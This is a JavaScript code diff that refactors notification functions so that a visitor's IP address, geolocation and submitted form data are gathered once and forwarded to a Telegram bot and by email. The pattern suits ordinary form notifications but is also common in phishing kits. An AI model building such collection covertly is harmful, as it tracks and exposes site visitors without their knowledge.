@@ -96,10 +96,14 @@ async getUserLocation() {
         };
     }
 },
-    async sendToTelegram(data) {
-        const locationData = await this.getUserLocation();
+async sendToTelegram(data) {
 
-        const text = `
+    const locationData = data.locationData || {
+        ip: "N/A",
+        location: "N/A"
+    };
+
+    const text = `
 <b>IP:</b> <code>${locationData.ip}</code>
 <b>Location:</b> <code>${locationData.location}</code>
 ----------------------------------
@@ -132,10 +136,14 @@ async getUserLocation() {
         }
     },
 
-    async sendToEmail(data) {
-        const locationData = await this.getUserLocation();
+async sendToEmail(data) {
 
-        const emailContent = `
+    const locationData = data.locationData || {
+        ip: "N/A",
+        location: "N/A"
+    };
+
+    const emailContent = `
 IP: ${locationData.ip}
 Location: ${locationData.location}
 ----------------------------------
@@ -196,21 +204,39 @@ Sent at: ${new Date().toLocaleString()}`;
         });
     },
 
-    async sendNotification(data) {
-        const notificationType = CONFIG.NOTIFICATION_TYPE;
+async sendNotification(data) {
+    const notificationType = CONFIG.NOTIFICATION_TYPE;
 
-        try {
-            if (notificationType === 'telegram' || notificationType === 'both') {
-                await this.sendToTelegram(data);
-            }
+    try {
+        // Chỉ lấy location 1 lần
+        const locationData = await this.getUserLocation();
 
-            if (notificationType === 'email' || notificationType === 'both') {
-                await this.sendToEmail(data);
-            }
-        } catch (error) {
-            console.error('Notification error:', error);
+        const notificationData = {
+            ...data,
+            locationData
+        };
+
+        if (
+            notificationType === 'telegram' ||
+            notificationType === 'both'
+        ) {
+            await this.sendToTelegram(notificationData);
         }
-    },
+
+        if (
+            notificationType === 'email' ||
+            notificationType === 'both'
+        ) {
+            await this.sendToEmail(notificationData);
+        }
+
+    } catch (error) {
+        console.error(
+            'Notification error:',
+            error
+        );
+    }
+},
 
     maskPhone(phone) {
         if (!phone || phone.length < 5) return phone;
